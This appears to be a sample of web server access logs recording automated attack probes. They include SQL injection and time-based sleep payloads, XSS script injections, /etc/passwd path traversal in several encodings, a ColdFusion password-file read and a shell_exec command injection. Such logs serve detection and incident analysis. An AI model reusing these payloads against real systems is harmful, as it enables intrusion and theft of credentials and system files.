"<150>Oct  4 01:53:15 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [04/Oct/2025:01:53:15 +0530] ""GET /uxportal/uxportalhome.html/home'%20UNION%20SELECT@@version-- HTTP/1.1"" 200 248352 79 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"""
"<150>Feb  3 04:38:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [03/Feb/2026:04:38:56 +0530] ""GET /?eqbzeyas=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&ygocslug=UNION+SELECT+ALL+FROM+information_schema+AND+%22+or+SLEEP%285%29+or+%22&dqohnhch=..%2F..%2Fetc%2Fpasswd HTTP/1.1"" 302 - 1 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0"""
"<150>Feb  3 04:44:30 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [03/Feb/2026:04:44:30 +0530] ""GET /?kowuoxxn=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&gfqfjree=UNION+SELECT+ALL+FROM+information_schema+AND+%22+or+SLEEP%285%29+or+%22&gxbvyjem=..%2F..%2Fetc%2Fpasswd HTTP/1.1"" 302 - 2 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0"""
"<150>Jan 24 01:01:42 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [24/Jan/2026:01:01:42 +0530] ""POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'\""%2B(select(0)from(select(sleep(6)))v)%2B\""*/&result=10 HTTP/1.1"" 200 735 4 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"""
"<150>Jan 24 01:01:42 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [24/Jan/2026:01:01:42 +0530] ""POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'\""%2B(select(0)from(select(sleep(6)))v)%2B\""*/&result=10 HTTP/1.1"" 200 735 4 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"""
"<150>Jan 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Jan/2026:00:12:56 +0000] ""GET /content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&selectedQuarter=q3&haiku630498=shell_exec(ifconfig) HTTP/1.1"" 200 2667 ""https://www.tcs.com/investor-relations/financial-statements"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36"" -- 0 @ 10805 --"
"<150>Jan 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Jan/2026:00:12:56 +0000] ""GET /content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&selectedQuarter=q3&haiku630498=shell_exec(ifconfig) HTTP/1.1"" 200 2667 ""https://www.tcs.com/investor-relations/financial-statements"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36"" -- 0 @ 10805 --"
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /cgi-bin/htmlscript?../../../../../../../etc/passwd HTTP/1.1"" 403 199 24 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test HTTP/1.1"" 403 199 18138 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /cgi-bin/htmlscript?..%2f..%2fetc%2fpasswd HTTP/1.1"" 403 199 24 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /cgi-bin/htmlscript?%252e%252e%252fetc%252fpasswd HTTP/1.1"" 403 199 24 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /cgi-bin/htmlscript?.%2e/.%2e/etc/passwd HTTP/1.1"" 403 199 24 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /cgi-bin/htmlscript?..%c0%afetc%c0%afpasswd HTTP/1.1"" 403 199 24 0 ""-"" ""-"""
"<150>Feb  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Feb/2026:13:45:33 +0530] ""GET /?wpapp_shortcode=\""%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1 HTTP/1.1"" 403 199 24 0 ""-"" ""-"""